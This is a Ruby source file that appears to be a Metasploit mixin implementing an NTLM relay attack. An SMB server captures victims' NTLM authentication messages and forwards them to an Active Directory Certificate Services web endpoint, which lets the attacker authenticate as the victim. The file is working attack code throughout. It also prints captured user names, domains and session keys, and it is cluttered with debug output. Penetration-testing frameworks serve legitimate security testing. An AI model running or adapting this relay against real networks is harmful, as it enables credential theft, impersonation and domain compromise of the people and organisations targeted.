###
#
# This mixin provides support for reporting captured SMB creds
#
###

module Msf::Exploit::Remote::SMB::Server::HttpRelay

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::NTLM::Client
  include Msf::Exploit::Remote::SMB::Server::HashCapture

  def print_ntlm_type1(ntlm_message)
    print_status("Sign: #{ntlm_message.sign.encoding}")
    print_status("Sign: #{bin_to_hex(ntlm_message.sign)}")

    print_status("Domain: #{ntlm_message.domain.encoding}")
    print_status("Domain: #{bin_to_hex(ntlm_message.domain)}")

    print_status("Workstation: #{ntlm_message.workstation.encoding}")
    print_status("Workstation: #{bin_to_hex(ntlm_message.workstation)}")

  end

  def print_ntlm_type3(ntlm_message)
    print_status("Sign: #{ntlm_message.sign.encoding}")
    print_status("Sign: #{ntlm_message.sign}")

    print_status("Domain: #{ntlm_message.domain.encoding}")
    print_status("Domain: #{bin_to_hex(ntlm_message.domain)}")

    print_status("User: #{ntlm_message.user.encoding}")
    print_status("User: #{bin_to_hex(ntlm_message.user)}")

    print_status("Workstation: #{ntlm_message.workstation.encoding}")
    print_status("Workstation: #{bin_to_hex(ntlm_message.workstation)}")

    print_status("Session Key: #{ntlm_message.session_key.encoding}")
    print_status("Session Key: #{bin_to_hex(ntlm_message.session_key)}")

    print_status("Sign: #{ntlm_message.domain}")
    print_status("Domain: #{ntlm_message.domain}")
    print_status("Workstation: #{ntlm_message.workstation}")
  end

  def ASCIItoUTF16LE(incoming_data)
    print_status("Original Encoding: #{incoming_data.encoding}")
    print_status("Original Hex: #{bin_to_hex(incoming_data)}")
    outgoing_data = incoming_data.force_encoding('ASCII-8BIT')
    print_status("New Encoding: #{outgoing_data.encoding}")
    print_status("New Hex: #{bin_to_hex(outgoing_data)}")
    outgoing_data = outgoing_data.encode('UTF-16LE')
    print_status("Final Encoding: #{outgoing_data.encoding}")
    print_status("Final Hex: #{bin_to_hex(outgoing_data)}")
    return outgoing_data
  end

  def relay_ntlm_type1(ntlm_type1)

    begin
      print_ntlm_type1(ntlm_type1)
      ntlm_type1.domain.force_encoding('ASCII-8BIT')
      ntlm_type1.workstation.force_encoding('ASCII-8BIT')

      print_ntlm_type1(ntlm_type1)

      print_status("Sending Handshake")
      res = send_request_cgi(
        {
          'method'  => 'GET',
          'uri'     => '/certsrv/csertfnsh.asp',
          'headers' => {
                          'Accept-Encoding' => 'identity'
                       }
        })
      if res.code != 401
        print_error("Server returned #{res.code.to_s}")
        return nil
      end

      print_line("Sending NTLM Message 1")
      res = send_request_cgi(
        {
          'method'  => 'GET',
          'uri'     => '/certsrv/csertfnsh.asp',
          'headers' => {
            'Accept-Encoding' => 'identity',
            'Authorization' => 'NTLM ' + ntlm_type1.encode64 }
        })
      print_status(res.headers['WWW-Authenticate'])
      ntlm_type2_b64 = res.headers['WWW-Authenticate'].split()[1]
      print_status(ntlm_type2_b64)
      ntlm_type2 = Net::NTLM::Message.decode64(ntlm_type2_b64)

    rescue Exception => e
      print_error(e.to_s)
    end
    vprint_status('NTLM Type 2 sent')
    return ntlm_type2

  end

  def relay_ntlm_type3(ntlm_type3)

    begin
      print_status('Trying to finish ntlm3')
      print_status("sign: #{ntlm_type3.sign.encoding}")
      print_status("lm_response: #{bin_to_hex(ntlm_type3.lm_response)}")
      print_status("ntlm_response: #{bin_to_hex(ntlm_type3.ntlm_response)}")

      print_status("Domain: #{ntlm_type3.domain.encoding}")
      print_status("Domain: #{bin_to_hex(ntlm_type3.domain)}")
      ntlm_type3.domain = ntlm_type3.domain.force_encoding('ASCII-8BIT')
      print_status("Domain: #{ntlm_type3.domain.encoding}")
      print_status("Domain: #{bin_to_hex(ntlm_type3.domain)}")

      #ntlm_type3.user.force_encoding('UTF-8')
      print_status("user: #{ntlm_type3.user.encoding}")
      print_status("user: #{bin_to_hex(ntlm_type3.user)}")
      ntlm_type3.user = ntlm_type3.user.force_encoding('ASCII-8BIT')
      print_status("user: #{ntlm_type3.user.encoding}")
      print_status("user: #{bin_to_hex(ntlm_type3.user)}")

      #ntlm_type3.workstation.force_encoding('UTF-8')
      print_status("workstation: #{ntlm_type3.workstation.encoding}")
      print_status("workstation: #{bin_to_hex(ntlm_type3.workstation)}")
      ntlm_type3.workstation = ntlm_type3.workstation.force_encoding('ASCII-8BIT')
      print_status("workstation: #{ntlm_type3.workstation.encoding}")
      print_status("workstation: #{bin_to_hex(ntlm_type3.workstation)}")

      print_status("session_key: #{bin_to_hex(ntlm_type3.session_key)}")
      #print_status("os_version: #{ntlm_type3.os_version.encoding}")

      print_status(ntlm_type3.encode64)
      decode_message = Base64.decode64(ntlm_type3.encode64)
      print_status("Base64 ntlm_tye3 message: #{bin_to_hex(decode_message)}")

    rescue Exception => e
      print_error(e.to_s)
    end

    res = send_request_cgi(
      {
        'method'  => 'GET',
        'uri'     => '/certsrv/csertfnsh.asp',
        'headers' => {
          'Accept-Encoding' => 'identity',
          'Authorization' => 'NTLM ' + ntlm_type3.encode64 }
      })

  end

  class HTTPRelayNTLMProvider < ::RubySMB::Gss::Provider::NTLM
    # @param [::WindowsError::NTStatus] ntlm_type3_status A specific NT Status to return as the response to the NTLM
    #   type 3 message. If this value is nil, the message will be processed as normal.
    def initialize(allow_anonymous: false, allow_guests: false, default_domain: 'WORKGROUP', listener: nil, ntlm_type3_status: ::WindowsError::NTStatus::STATUS_ACCESS_DENIED)
      super(allow_anonymous: allow_anonymous, allow_guests: allow_guests, default_domain: default_domain)
      @listener = listener
      @ntlm_type3_status = ntlm_type3_status
      @http_client = nil
    end

    # Needs overwritten to ensure our version of Authenticator is returned
    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      HTTPRelayAuthenticator.new(self, server_client)
    end

    attr_reader :listener
    attr_accessor :ntlm_type3_status
  end

  class HTTPRelayAuthenticator < ::RubySMB::Gss::Provider::NTLM::Authenticator

    def process_ntlm_type1(type1_msg)
      @ntlm_type1 = type1_msg
      @ntlm_type2 = @provider.listener.relay_ntlm_type1(type1_msg)
      @ntlm_type2
    end

    def process_ntlm_type3(type3_msg)
      @provider.listener.relay_ntlm_type3(type3_msg)
    end


  end
end
